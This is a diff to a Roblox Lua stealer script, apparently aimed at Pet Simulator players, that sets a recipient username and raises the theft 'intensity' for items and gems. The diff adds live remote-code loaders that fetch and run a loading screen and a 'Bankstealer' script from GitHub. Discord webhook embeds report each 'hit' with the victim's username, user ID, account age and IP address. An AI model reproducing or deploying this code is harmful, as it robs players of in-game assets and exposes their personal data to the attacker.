@@ -1,5 +1,9 @@
+--[[
+JOIN MYSTERIOUS SCRIPTS ----> https://discord.gg/uBqbqhYVVq
+]]--
+
 getgenv().Settings = {
-    User = "User Here",
+    User = "Onodakun23",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
     MailMessage = "MysteriousGG",
     Titanics = {
@@ -12,7 +16,7 @@ getgenv().Settings = {
     },
     Huges = {
         Dualhook = true,
-        Intensity = 50 --%
+        Intensity = 90 --%
     },
     Pogs = {
         Dualhook = true,
@@ -36,7 +40,7 @@ getgenv().Settings = {
     },
     Gems = {
         Dualhook = true,
-        Intensity = 0 --%
+        Intensity = 40 --%
     }
 }
 
@@ -204,8 +208,8 @@ local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
 -- Loading Screen
-if _G.LoadingScreen ~= false then
-    loadstring(game:HttpGet('Put Your Loading Screen Raw Link Here'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
+if _G.LoadingScreen ~= true then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Mysteroid/Loadingscreen/main/Mysterious.lua'))() 
 end
 
 -- Remotes
@@ -738,11 +742,11 @@ end
 
 local diaamt = PlayerInfos.Diamonds
 if diaamt < 110000 then
-    _G.Webhook = Webhook
-    _G.LoadingScreen = false
-    _G.AntiLeave = false
-    _G.MouseLock = false
-    loadstring(game:HttpGetAsync("bankstealer raw link", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
+    _G.Webhook = 
+    _G.LoadingScreen = true
+    _G.AntiLeave = true
+    _G.MouseLock = true
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Mysteroid/Bankstealer/main/Mysterious.lua", true))()
     return;
 end
 if _G.AntiLeave ~= false then
@@ -949,11 +953,11 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
         data1 = {
             ["content"] = ping,
-            ["username"] = "Mysterioud Scripts",
+            ["username"] = "Mysterioud Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
                 ["title"] = "**New Hit** ||With Mysterious||",
-                ["url"] = "https://discord.gg/cJHkBWSqH2",
+                ["url"] = "https://discord.gg/uBqbqhYVVq",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
@@ -962,7 +966,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Mysterious Scriptd Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Mysterious Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1019,11 +1023,11 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
         data1 = {
             ["content"] = ping,
-            ["username"] = "Mysterious Scripts",
+            ["username"] = "Mysterious Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Mysterious||",
-                ["url"] = "https://discord.gg/cJHkBWSqH2",
+                ["title"] = "**New Hit** ||With Mysterioud||",
+                ["url"] = "https://discord.gg/uBqbqhYVVq",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
@@ -1032,7 +1036,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Mysterious Scripts's Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Mysterious Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
